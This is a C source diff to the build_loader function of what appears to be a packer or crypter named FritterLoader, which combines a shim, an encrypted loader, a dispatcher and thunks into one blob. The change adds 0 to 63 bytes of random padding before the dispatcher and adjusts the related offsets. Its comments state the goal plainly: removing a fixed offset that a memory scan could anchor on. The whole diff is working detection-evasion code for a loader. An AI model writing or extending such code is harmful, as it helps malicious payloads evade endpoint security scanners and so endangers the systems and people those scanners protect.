@@ -1909,6 +1909,7 @@ static int build_loader(PFRITTER_CONFIG c) {
     uint32_t protected_ref_count = 0;
     uint32_t disp_slot  = 0;
     uint32_t thunks_size = 0;
+    uint32_t pre_disp_pad = 0;  /* random 0..63 bytes before dispatcher */
     if(use_ngt1) {
       /* Residency policy: only .text (FritterLoader + MainProcEntry +
          untagged helpers) stays resident because the shim jmps to its
@@ -1925,10 +1926,16 @@ static int build_loader(PFRITTER_CONFIG c) {
       }
       disp_slot  = DISPATCHER_MAX_SIZE;
       thunks_size = protected_ref_count * THUNK_SIZE;
-      DPRINT("N>1 dispatch: FN_COUNT=%u REF_COUNT=%u protected_refs=%u disp_slot=%u thunks=%u",
-             L_FN_COUNT, L_REF_COUNT, protected_ref_count, disp_slot, thunks_size);
+      /* Structural jitter: 0..63 random bytes between loader end and
+         dispatcher entry. Kills the "dispatcher always at loader+0"
+         relative offset that a memory scan could otherwise anchor on. */
+      uint8_t pad_rnd;
+      gen_random(&pad_rnd, 1);
+      pre_disp_pad = pad_rnd & 0x3F;
+      DPRINT("N>1 dispatch: FN_COUNT=%u REF_COUNT=%u protected_refs=%u pre_disp_pad=%u disp_slot=%u thunks=%u",
+             L_FN_COUNT, L_REF_COUNT, protected_ref_count, pre_disp_pad, disp_slot, thunks_size);
     }
-    uint32_t tail_extra = disp_slot + thunks_size;
+    uint32_t tail_extra = pre_disp_pad + disp_slot + thunks_size;
 
     // Build combined blob: [shim (page-padded)] [loader] [tail_extra when N>1]
     uint32_t combined_size = shim_padded_size + loader_size + tail_extra;
@@ -2022,8 +2029,10 @@ static int build_loader(PFRITTER_CONFIG c) {
         gen_random(combined + shim_padded_size + loader_size, tail_extra);
       }
 
-      // Emit dispatcher at start of tail
-      uint32_t disp_off_in_blob   = shim_padded_size + loader_size;
+      // Emit dispatcher after pre_disp_pad bytes of random junk. The
+      // padding sits inside the RESIDENT tail entry so nothing tries to
+      // decrypt it; its bytes came from gen_random above.
+      uint32_t disp_off_in_blob   = shim_padded_size + loader_size + pre_disp_pad;
       uint32_t loader_off_in_blob = shim_padded_size;
       uint32_t actual_disp_size = emit_dispatcher(combined + disp_off_in_blob,
                                                    disp_off_in_blob,
@@ -2056,7 +2065,8 @@ static int build_loader(PFRITTER_CONFIG c) {
                                               + L_REFS[r].inst_length
                                               + current_disp);
 
-        uint32_t thunk_off_in_loader = loader_size + DISPATCHER_MAX_SIZE
+        uint32_t thunk_off_in_loader = loader_size + pre_disp_pad
+                                       + DISPATCHER_MAX_SIZE
                                        + thunk_i * THUNK_SIZE;
         uint32_t thunk_off_in_blob   = shim_padded_size + thunk_off_in_loader;
 
@@ -2118,7 +2128,7 @@ static int build_loader(PFRITTER_CONFIG c) {
       // so the shim's (no-op) decrypt loop skips it and the dispatcher
       // doesn't try to crypt it either.
       uint32_t tail_e_off = loader_size;
-      uint32_t tail_e_sz  = DISPATCHER_MAX_SIZE + thunks_size;
+      uint32_t tail_e_sz  = pre_disp_pad + DISPATCHER_MAX_SIZE + thunks_size;
       uint8_t *tail_entry = combined + ft_off + 16 + L_FN_COUNT * 12;
       memcpy(tail_entry + 0, &tail_e_off, 4);
       memcpy(tail_entry + 4, &tail_e_sz,  4);
